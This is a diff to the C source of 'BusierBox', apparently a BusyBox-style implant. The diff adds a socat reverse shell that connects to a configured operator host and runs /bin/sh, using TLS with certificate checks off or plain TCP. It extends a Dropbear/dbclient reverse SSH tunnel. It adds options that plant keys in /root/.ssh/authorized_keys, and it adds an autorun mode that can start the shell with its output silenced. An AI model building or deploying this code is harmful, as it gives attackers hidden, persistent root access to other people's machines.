@@ -18,6 +18,9 @@
 #define PATH_MAX 4096
 #endif
 
+#ifndef BB_RUNTIME_MODE
+#define BB_RUNTIME_MODE "extract"
+#endif
 #ifndef BB_ENABLE_SURVEY
 #define BB_ENABLE_SURVEY 1
 #endif
@@ -33,20 +36,20 @@
 #ifndef BB_ENABLE_FETCH_FULL
 #define BB_ENABLE_FETCH_FULL 1
 #endif
-#ifndef BB_ENABLE_CALLBACK
-#define BB_ENABLE_CALLBACK 1
-#endif
 #ifndef BUSIERBOX_ARTIFACT_TIER
 #define BUSIERBOX_ARTIFACT_TIER "full"
 #endif
 #ifndef BB_ARTIFACT_KIND
 #define BB_ARTIFACT_KIND BUSIERBOX_ARTIFACT_TIER
 #endif
-#ifndef BB_STAGER_ZERO_ARG_MODE
-#define BB_STAGER_ZERO_ARG_MODE "help"
-#endif
 #ifndef BB_FULL_ZERO_ARG_MODE
 #define BB_FULL_ZERO_ARG_MODE "help"
+#endif
+#ifndef BB_ZERO_ARG_MODE
+#define BB_ZERO_ARG_MODE BB_FULL_ZERO_ARG_MODE
+#endif
+#ifndef BB_ZERO_ARG_LOG_MODE
+#define BB_ZERO_ARG_LOG_MODE "quiet"
 #endif
 #ifndef BB_ZERO_ARG_CUSTOM_COMMAND
 #define BB_ZERO_ARG_CUSTOM_COMMAND ""
@@ -54,11 +57,29 @@
 #ifndef BB_RSHELL_MODE
 #define BB_RSHELL_MODE "ssh"
 #endif
+#ifndef BB_RSHELL_TRANSPORT
+#define BB_RSHELL_TRANSPORT BB_RSHELL_MODE
+#endif
+#ifndef BB_RSHELL_AUTHKEYS_MODE
+#define BB_RSHELL_AUTHKEYS_MODE "disabled"
+#endif
+#ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
+#define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
+#endif
+#ifndef BB_RSHELL_SOCAT_PORT
+#define BB_RSHELL_SOCAT_PORT "22203"
+#endif
 #ifndef BB_AUTORUN_GUARD_ENABLE
 #define BB_AUTORUN_GUARD_ENABLE "yes"
 #endif
 #ifndef BB_AUTORUN_GUARD_PATH
-#define BB_AUTORUN_GUARD_PATH "/tmp/busierbox-autorun"
+#define BB_AUTORUN_GUARD_PATH BB_RUNTIME_ROOT "/run"
+#endif
+#ifndef BB_RSHELL_ENCRYPTION
+#define BB_RSHELL_ENCRYPTION "tls"
+#endif
+#ifndef BB_RSHELL_ALLOW_PLAINTEXT
+#define BB_RSHELL_ALLOW_PLAINTEXT "no"
 #endif
 #ifndef BB_AUTORUN_REENTRY_ACTION
 #define BB_AUTORUN_REENTRY_ACTION "status"
@@ -106,9 +127,6 @@ const struct bb_applet bb_applets[] = {
 #endif
 #if BB_ENABLE_FETCH_FULL
     {"fetch-full", applet_fetch_full_main, "download a full BusierBox artifact"},
-#endif
-#if BB_ENABLE_CALLBACK
-    {"callback", applet_callback_main, "call back to operator station using stager protocol"},
 #endif
     {"rshell", applet_rshell_main, "start configured reverse shell transport"},
 };
@@ -219,7 +237,7 @@ static int reentry_action(void)
 
 static int guard_needed(const char *mode)
 {
-    return !strcmp(mode, "callback") || !strcmp(mode, "shell") || !strcmp(mode, "custom");
+    return !strcmp(mode, "rshell") || !strcmp(mode, "custom") || !strcmp(mode, "shell");
 }
 
 static int acquire_autorun_guard(const char *mode)
@@ -300,35 +318,175 @@ static int path_exec(const char *path)
 
 int applet_rshell_main(int argc, char **argv)
 {
-    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX];
+    char payload[PATH_MAX], dropbear[PATH_MAX], dbclient[PATH_MAX], dropbearkey[PATH_MAX], socat[PATH_MAX];
     char hostkey[PATH_MAX], identity[PATH_MAX], authkeys[PATH_MAX], rootssh[PATH_MAX];
     char cmd[8192] = "";
+    const char *subcmd = "start";
+    const char *transport = BB_RSHELL_TRANSPORT;
+    int i;
     int rc;
 
+    if (!strcmp(BB_RSHELL_TRANSPORT, "none")) {
+        fputs("rshell: reverse shell is disabled in this build (BB_RSHELL_TRANSPORT=none)\n", stderr);
+        return 1;
+    }
+
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
-        puts("usage: busierbox rshell");
-        puts("Starts the configured reverse shell transport. Current transport: ssh/dropbear/dbclient.");
+        puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat|builtin]");
+        puts("Starts or manages the configured reverse access transport.");
+        printf("Configured transport: %s  encryption: %s\n", BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION);
+#ifdef HAVE_WOLFSSL
+        puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh), builtin (wolfSSL TLS shell).");
+#else
+        puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh).");
+        puts("builtin TLS available when rebuilt with BB_BUILTIN_TLS_ENABLE=yes and wolfSSL installed.");
+#endif
         return 0;
     }
-    if (strcmp(BB_RSHELL_MODE, "ssh")) {
-        fprintf(stderr, "rshell: unsupported transport '%s'\n", BB_RSHELL_MODE);
+    if (argc > 1 && argv[1][0] != '-')
+        subcmd = argv[1];
+    for (i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--transport") && i + 1 < argc) {
+            transport = argv[++i];
+        } else if (!strncmp(argv[i], "--transport=", 12)) {
+            transport = argv[i] + 12;
+        }
+    }
+
+    if (!strcmp(subcmd, "status")) {
+        const char *guard = autorun_guard_path();
+        char status_path[PATH_MAX], lock_path[PATH_MAX];
+        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
+        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
+        if (access(status_path, R_OK) == 0) {
+            char buf[512];
+            FILE *fp = fopen(status_path, "r");
+            while (fp && fgets(buf, sizeof(buf), fp))
+                fputs(buf, stdout);
+            if (fp)
+                fclose(fp);
+            return 0;
+        }
+        if (access(lock_path, R_OK) == 0) {
+            puts("rshell_status=possibly-active");
+            printf("rshell_guard=%s\n", guard);
+            return 0;
+        }
+        puts("rshell_status=inactive");
+        printf("rshell_guard=%s\n", guard);
+        return 0;
+    }
+    if (!strcmp(subcmd, "stop") || !strcmp(subcmd, "restart")) {
+        const char *guard = autorun_guard_path();
+        char pid_path[PATH_MAX], lock_path[PATH_MAX], status_path[PATH_MAX];
+        static const char *pid_files[] = {
+            "dropbear.pid", "dbclient.pid", "socat.pid", NULL
+        };
+        int k;
+        for (k = 0; pid_files[k]; k++) {
+            long pid = -1;
+            char dummy[8] = "";
+            snprintf(pid_path, sizeof(pid_path), "%s/%s", guard, pid_files[k]);
+            if (read_lock_pid(pid_path, &pid, dummy, sizeof(dummy)) == 0 && pid > 1) {
+                if (kill((pid_t)pid, 0) == 0 || errno != ESRCH)
+                    kill((pid_t)pid, SIGTERM);
+            }
+            unlink(pid_path);
+        }
+        snprintf(lock_path, sizeof(lock_path), "%s/rshell.lock", guard);
+        snprintf(status_path, sizeof(status_path), "%s/rshell.status", guard);
+        snprintf(pid_path, sizeof(pid_path), "%s/autorun.lock", guard);
+        unlink(lock_path);
+        unlink(status_path);
+        unlink(pid_path);
+        if (!strcmp(subcmd, "stop")) {
+            puts("rshell_stopped=yes");
+            return 0;
+        }
+        subcmd = "start";
+    }
+    if (strcmp(subcmd, "start")) {
+        fprintf(stderr, "rshell: unknown subcommand '%s'\n", subcmd);
         return 2;
+    }
+
+    /* Accept old transport names for backward compat */
+    if (!strcmp(transport, "builtin-tls"))
+        transport = "builtin";
+    if (!strcmp(transport, "socat-tls"))
+        transport = "socat";
+
+    if (!strcmp(transport, "builtin")) {
+#ifdef HAVE_WOLFSSL
+        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls") || !strcmp(BB_BUILTIN_TLS_ENABLE, "yes"))
+            return rshell_builtin_tls(BB_OPERATOR_SERVER_HOST, BB_RSHELL_SOCAT_PORT);
+        fputs("rshell: builtin transport with encryption=none is not implemented\n", stderr);
+        return 2;
+#else
+        fputs("rshell: builtin transport requires wolfSSL; rebuild with BB_BUILTIN_TLS_ENABLE=yes\n", stderr);
+        return 2;
+#endif
+    }
+    if (strcmp(transport, "ssh") && strcmp(transport, "socat")) {
+        fprintf(stderr, "rshell: unsupported transport '%s' (supported: ssh, socat, builtin)\n", transport);
+        return 2;
+    }
+    if (!strcmp(BB_RUNTIME_MODE, "core-only")) {
+        fprintf(stderr, "rshell: transport '%s' requires staged payload tools but runtime mode is core-only\n", transport);
+        fputs("rshell: change Runtime mode to 'extract' or 'no-residue' in menuconfig, then rebuild\n", stderr);
+#ifndef HAVE_WOLFSSL
+        fputs("rshell: for a no-extraction shell, rebuild with BB_BUILTIN_TLS_ENABLE=yes (requires wolfSSL) and transport=builtin\n", stderr);
+#endif
+        return 127;
     }
     if (!BB_OPERATOR_SERVER_HOST[0]) {
         fputs("rshell: operator host is not configured; set it in menuconfig under Payload Options -> Applet configuration -> Reverse shell\n", stderr);
         return 2;
     }
     if (bb_ensure_payload_dir(payload, sizeof(payload)) != 0) {
-        fputs("rshell: payload unavailable; cannot start Dropbear/dbclient\n", stderr);
+        fputs("rshell: payload unavailable; cannot start reverse shell transport\n", stderr);
         return 127;
     }
     snprintf(dropbear, sizeof(dropbear), "%s/bin/dropbear", payload);
     snprintf(dbclient, sizeof(dbclient), "%s/bin/dbclient", payload);
     snprintf(dropbearkey, sizeof(dropbearkey), "%s/bin/dropbearkey", payload);
+    snprintf(socat, sizeof(socat), "%s/bin/socat", payload);
     snprintf(hostkey, sizeof(hostkey), "%s/etc/dropbear/dropbear_rsa_host_key", payload);
     snprintf(identity, sizeof(identity), "%s/home/.ssh/id_dbclient", payload);
     snprintf(authkeys, sizeof(authkeys), "%s/home/.ssh/authorized_keys", payload);
     snprintf(rootssh, sizeof(rootssh), "%s", "/root/.ssh");
+
+    if (!strcmp(transport, "socat")) {
+        if (!path_exec(socat)) {
+            fputs("rshell: socat transport requires staged socat; enable socat in Heavy tools and rebuild\n", stderr);
+            return 127;
+        }
+        if (!strcmp(BB_RSHELL_ENCRYPTION, "tls")) {
+            strcat(cmd, "exec ");
+            shquote_append(cmd, sizeof(cmd), socat);
+            strcat(cmd, " OPENSSL:");
+            shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT ",verify=0");
+            strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
+        } else {
+            /* plaintext — only when explicitly allowed */
+            if (strcmp(BB_RSHELL_ALLOW_PLAINTEXT, "yes")) {
+                fputs("rshell: socat plaintext requires BB_RSHELL_ALLOW_PLAINTEXT=yes (insecure/debug only)\n", stderr);
+                return 2;
+            }
+            fputs("rshell: WARNING: starting PLAINTEXT socat shell — insecure/debug only\n", stderr);
+            strcat(cmd, "exec ");
+            shquote_append(cmd, sizeof(cmd), socat);
+            strcat(cmd, " TCP:");
+            shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_HOST ":" BB_RSHELL_SOCAT_PORT);
+            strcat(cmd, " EXEC:/bin/sh,pty,stderr,setsid,sigint,sane");
+        }
+        rc = system(cmd);
+        if (rc == -1)
+            return 1;
+        if (WIFEXITED(rc))
+            return WEXITSTATUS(rc);
+        return 1;
+    }
 
     if (!path_exec(dropbear) || !path_exec(dbclient)) {
         fputs("rshell: dropbear/dbclient are not staged; enable dropbear in Heavy tools and rebuild\n", stderr);
@@ -339,65 +497,107 @@ int applet_rshell_main(int argc, char **argv)
         return 127;
     }
 
-    strcat(cmd, "set -eu; ");
-    /* Kill any leftover payload dropbear/dbclient from previous sessions so the
-     * new one can bind the configured port cleanly. */
-    strcat(cmd, "pkill -f ");
-    shquote_append(cmd, sizeof(cmd), dropbear);
-    strcat(cmd, " 2>/dev/null || true; ");
-    strcat(cmd, "pkill -f ");
-    shquote_append(cmd, sizeof(cmd), dbclient);
-    strcat(cmd, " 2>/dev/null || true; ");
-    strcat(cmd, "sleep 1; ");
+    /* Check if rshell is already running using recorded PID files */
+    {
+        char dbclient_pid_path[PATH_MAX];
+        long existing_pid = -1;
+        char dummy_mode[8] = "";
+        const char *guard = autorun_guard_path();
+        snprintf(dbclient_pid_path, sizeof(dbclient_pid_path), "%s/dbclient.pid", guard);
+        if (read_lock_pid(dbclient_pid_path, &existing_pid, dummy_mode, sizeof(dummy_mode)) == 0
+                && existing_pid > 1 && kill((pid_t)existing_pid, 0) == 0) {
+            printf("rshell_status=already-active\n");
+            printf("rshell_dbclient_pid=%ld\n", existing_pid);
+            fputs("rshell: already running; use 'busierbox rshell stop' then 'start' to restart\n", stderr);
+            return 0;
+        }
+    }
+
+    {
+        char _log_dir[PATH_MAX];
+        snprintf(_log_dir, sizeof(_log_dir), "%s", autorun_guard_path());
+        mkdir_p(_log_dir);
+        strcat(cmd, "set -eu; ");
+        strcat(cmd, "mkdir -p ");
+        shquote_append(cmd, sizeof(cmd), _log_dir);
+        strcat(cmd, " ");
+    }
     strcat(cmd, "mkdir -p ");
     shquote_append(cmd, sizeof(cmd), rootssh);
     strcat(cmd, " ");
     strcat(cmd, "$(dirname ");
     shquote_append(cmd, sizeof(cmd), hostkey);
     strcat(cmd, "); ");
-    strcat(cmd, "if [ -f ");
-    shquote_append(cmd, sizeof(cmd), authkeys);
-    strcat(cmd, " ]; then cat ");
-    shquote_append(cmd, sizeof(cmd), authkeys);
-    strcat(cmd, " >>/root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
+        strcat(cmd, "if [ -f ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then cp ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
+        strcat(cmd, "if [ -f ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
+        shquote_append(cmd, sizeof(cmd), authkeys);
+        strcat(cmd, "; echo '# END BUSIERBOX RSHELL'; } >$tmp && mv $tmp /root/.ssh/authorized_keys 2>/dev/null || rm -f $tmp; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
+    }
+    if (!strcmp(BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING, "yes")) {
+        strcat(cmd, "if [ ! -f ");
+        shquote_append(cmd, sizeof(cmd), hostkey);
+        strcat(cmd, " ] && [ -x ");
+        shquote_append(cmd, sizeof(cmd), dropbearkey);
+        strcat(cmd, " ]; then ");
+        shquote_append(cmd, sizeof(cmd), dropbearkey);
+        strcat(cmd, " -t rsa -f ");
+        shquote_append(cmd, sizeof(cmd), hostkey);
+        strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
+    }
     strcat(cmd, "if [ ! -f ");
     shquote_append(cmd, sizeof(cmd), hostkey);
-    strcat(cmd, " ] && [ -x ");
-    shquote_append(cmd, sizeof(cmd), dropbearkey);
-    strcat(cmd, " ]; then ");
-    shquote_append(cmd, sizeof(cmd), dropbearkey);
-    strcat(cmd, " -t rsa -f ");
-    shquote_append(cmd, sizeof(cmd), hostkey);
-    strcat(cmd, " >/dev/null 2>&1 || true; fi; ");
-    shquote_append(cmd, sizeof(cmd), dropbear);
-    strcat(cmd, " -r ");
-    shquote_append(cmd, sizeof(cmd), hostkey);
-    strcat(cmd, " -p ");
-    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
-    strcat(cmd, " -F -E >/tmp/busierbox-dropbear.log 2>&1 & dbpid=$!; ");
-    shquote_append(cmd, sizeof(cmd), dbclient);
-    strcat(cmd, " -i ");
-    shquote_append(cmd, sizeof(cmd), identity);
-    if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
-        strcat(cmd, " -y");
-    strcat(cmd, " -K 30 -N -R ");
-    shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
-    strcat(cmd, " -p ");
-    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
-    strcat(cmd, " ");
-    shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
-    strcat(cmd, " >/tmp/busierbox-dbclient.log 2>&1 & dcpid=$!; ");
-    strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
-    strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'");
+    strcat(cmd, " ]; then echo 'rshell: missing Dropbear host key; enable pre-generated host key or allow runtime host-key generation' >&2; exit 2; fi; ");
+    {
+        char _db_log[PATH_MAX], _dc_log[PATH_MAX];
+        const char *_guard = autorun_guard_path();
+        snprintf(_db_log, sizeof(_db_log), "%s/dropbear.log", _guard);
+        snprintf(_dc_log, sizeof(_dc_log), "%s/dbclient.log", _guard);
 
-    /* Use popen so we can capture the dbclient PID and write it to the autorun
-     * guard lock.  dbclient stays alive exactly as long as the tunnel is open,
-     * so a live dbclient PID means a second rshell should be blocked. */
+        shquote_append(cmd, sizeof(cmd), dropbear);
+        strcat(cmd, " -r ");
+        shquote_append(cmd, sizeof(cmd), hostkey);
+        strcat(cmd, " -p ");
+        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        strcat(cmd, " -F -E >");
+        shquote_append(cmd, sizeof(cmd), _db_log);
+        strcat(cmd, " 2>&1 & dbpid=$!; ");
+        shquote_append(cmd, sizeof(cmd), dbclient);
+        strcat(cmd, " -i ");
+        shquote_append(cmd, sizeof(cmd), identity);
+        if (!strcmp(BB_OPERATOR_KNOWN_HOSTS_POLICY, "off"))
+            strcat(cmd, " -y");
+        strcat(cmd, " -K 30 -N -R ");
+        shquote_append(cmd, sizeof(cmd), "127.0.0.1:" BB_OPERATOR_REMOTE_FORWARD_PORT ":" BB_OPERATOR_TARGET_BIND_HOST ":" BB_OPERATOR_TARGET_DROPBEAR_PORT);
+        strcat(cmd, " -p ");
+        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_SSH_PORT);
+        strcat(cmd, " ");
+        shquote_append(cmd, sizeof(cmd), BB_OPERATOR_SERVER_USER "@" BB_OPERATOR_SERVER_HOST);
+        strcat(cmd, " >");
+        shquote_append(cmd, sizeof(cmd), _dc_log);
+        strcat(cmd, " 2>&1 & dcpid=$!; ");
+        strcat(cmd, "echo rshell_started=yes; echo dropbear_pid=$dbpid; echo dbclient_pid=$dcpid; ");
+        strcat(cmd, "echo connect_hint='ssh -p " BB_OPERATOR_REMOTE_FORWARD_PORT " root@127.0.0.1'; ");
+        strcat(cmd, "echo dropbear_log=");
+        shquote_append(cmd, sizeof(cmd), _db_log);
+        strcat(cmd, "; echo dbclient_log=");
+        shquote_append(cmd, sizeof(cmd), _dc_log);
+    }
+
+    /* Use popen to capture dropbear and dbclient PIDs from the shell script. */
     {
         FILE *fp;
-        char line[256];
-        long dbclient_pid = -1;
+        char line[512];
+        long dropbear_pid = -1, dbclient_pid = -1;
         int exit_status = 0;
+        const char *gp = autorun_guard_path();
 
         fp = popen(cmd, "r");
         if (!fp)
@@ -405,26 +605,62 @@ int applet_rshell_main(int argc, char **argv)
         while (fgets(line, sizeof(line), fp)) {
             fputs(line, stdout);
             fflush(stdout);
-            if (strncmp(line, "dbclient_pid=", 13) == 0)
+            if (strncmp(line, "dropbear_pid=", 13) == 0)
+                dropbear_pid = strtol(line + 13, NULL, 10);
+            else if (strncmp(line, "dbclient_pid=", 13) == 0)
                 dbclient_pid = strtol(line + 13, NULL, 10);
         }
         rc = pclose(fp);
         if (rc != -1 && WIFEXITED(rc))
             exit_status = WEXITSTATUS(rc);
 
-        /* Write the autorun guard lock with dbclient's PID.  dbclient is alive
-         * exactly as long as the reverse tunnel is open, so zero-arg reentry
-         * while the tunnel is up will hit a live PID and be blocked. */
-        if (dbclient_pid > 0 && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
-            char lock_path[PATH_MAX];
+        if ((dropbear_pid > 0 || dbclient_pid > 0) && yes_value(BB_AUTORUN_GUARD_ENABLE)) {
+            char path[PATH_MAX];
             int lfd;
-            const char *gp = autorun_guard_path();
+            time_t now = time(NULL);
             mkdir_p(gp);
-            snprintf(lock_path, sizeof(lock_path), "%s/autorun.lock", gp);
-            lfd = open(lock_path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+
+            /* Individual PID files for clean stop/kill */
+            if (dropbear_pid > 0) {
+                snprintf(path, sizeof(path), "%s/dropbear.pid", gp);
+                lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+                if (lfd >= 0) {
+                    dprintf(lfd, "pid=%ld\n", dropbear_pid);
+                    close(lfd);
+                }
+            }
+            if (dbclient_pid > 0) {
+                snprintf(path, sizeof(path), "%s/dbclient.pid", gp);
+                lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+                if (lfd >= 0) {
+                    dprintf(lfd, "pid=%ld\n", dbclient_pid);
+                    close(lfd);
+                }
+            }
+
+            /* autorun.lock: use dbclient PID so guard detects live tunnel */
+            snprintf(path, sizeof(path), "%s/autorun.lock", gp);
+            lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
             if (lfd >= 0) {
                 dprintf(lfd, "mode=rshell\npid=%ld\nstarted_at=%ld\nartifact_tier=%s\n",
-                        dbclient_pid, (long)time(NULL), BUSIERBOX_ARTIFACT_TIER);
+                        dbclient_pid > 0 ? dbclient_pid : dropbear_pid,
+                        (long)now, BUSIERBOX_ARTIFACT_TIER);
+                close(lfd);
+            }
+
+            /* rshell.status for 'busierbox rshell status' */
+            snprintf(path, sizeof(path), "%s/rshell.status", gp);
+            lfd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0600);
+            if (lfd >= 0) {
+                dprintf(lfd,
+                    "state=active\ntransport=%s\nencryption=%s\n"
+                    "dropbear_pid=%ld\ndbclient_pid=%ld\n"
+                    "connect_hint=ssh -p %s root@127.0.0.1\n"
+                    "started_at=%ld\n",
+                    transport, BB_RSHELL_ENCRYPTION,
+                    dropbear_pid, dbclient_pid,
+                    BB_OPERATOR_REMOTE_FORWARD_PORT,
+                    (long)now);
                 close(lfd);
             }
         }
@@ -449,17 +685,17 @@ static int run_custom_zero_arg(void)
 
 static int run_zero_arg_mode(const char *mode)
 {
-    char *callback_argv[] = { "callback", NULL };
     char *rshell_argv[] = { "rshell", NULL };
+    char *survey_argv[] = { "survey", NULL };
 
     if (!mode || !*mode || !strcmp(mode, "help") || !strcmp(mode, "menu") ||
-        !strcmp(mode, "survey") || !strcmp(mode, "doctor")) {
+        !strcmp(mode, "doctor")) {
         usage(!mode || !*mode || !strcmp(mode, "help") ? stderr : stdout);
         return !mode || !*mode || !strcmp(mode, "help") ? 2 : 0;
     }
-    if (!strcmp(mode, "callback"))
-        return applet_callback_main(1, callback_argv);
-    if (!strcmp(mode, "shell") || !strcmp(mode, "bootstrap") || !strcmp(mode, "operator-session"))
+    if (!strcmp(mode, "survey"))
+        return applet_survey_main(1, survey_argv);
+    if (!strcmp(mode, "rshell"))
         return applet_rshell_main(1, rshell_argv);
     if (!strcmp(mode, "custom"))
         return run_custom_zero_arg();
@@ -472,14 +708,19 @@ static int zero_arg_main(void)
 {
     const char *mode = getenv("BUSIERBOX_ZERO_ARG_MODE");
     if (!mode || !*mode) {
-        if (!strcmp(BUSIERBOX_ARTIFACT_TIER, "stager"))
-            mode = BB_STAGER_ZERO_ARG_MODE;
-        else
-            mode = BB_FULL_ZERO_ARG_MODE;
+        mode = BB_ZERO_ARG_MODE;
     }
     if (getenv("BUSIERBOX_NO_AUTORUN") && !strcmp(getenv("BUSIERBOX_NO_AUTORUN"), "1")) {
         usage(stdout);
         return 0;
+    }
+    if (!strcmp(BB_ZERO_ARG_LOG_MODE, "none")) {
+        int _devnull = open("/dev/null", O_WRONLY);
+        if (_devnull >= 0) {
+            dup2(_devnull, STDOUT_FILENO);
+            dup2(_devnull, STDERR_FILENO);
+            close(_devnull);
+        }
     }
     if (!acquire_autorun_guard(mode))
         return 0;
